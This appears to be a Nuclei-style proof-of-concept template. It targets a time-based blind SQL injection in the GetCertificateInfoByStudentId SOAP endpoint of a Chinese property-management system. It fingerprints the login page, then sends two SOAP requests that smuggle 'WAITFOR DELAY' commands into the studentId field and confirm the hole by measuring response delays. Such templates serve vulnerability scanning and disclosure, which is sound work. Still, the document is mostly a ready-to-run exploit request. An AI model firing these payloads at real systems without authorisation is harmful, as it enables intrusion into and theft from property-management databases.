id: poc-yaml-new-window-getcertificateinfobystudentid-sqli
info:
  name: "新视窗新一代物业管理系统 GetCertificateInfoByStudentId SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 新视窗新一代物业管理系统
http:
  - method: GET
    path:
      - "{{BaseURL}}/loginV8.aspx?"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "BPMSite/ClientSupport/OCXInstall.aspx"
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: http://tempuri.org/GetCertificateInfoByStudentId
        
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
         <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
        <studentId>1;WAITFOR DELAY '0:0:5'--</studentId>
        </GetCertificateInfoByStudentId>
        </soap:Body>
        </soap:Envelope>
      - |
        POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: http://tempuri.org/GetCertificateInfoByStudentId
        
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
         <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
        <studentId>1;WAITFOR DELAY '0:0:8'--</studentId>
        </GetCertificateInfoByStudentId>
        </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<GetCertificateInfoByStudentIdResult>"
      - type: word
        part: header
        words:
          - "text/xml"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
      - type: status
        status:
          - 200
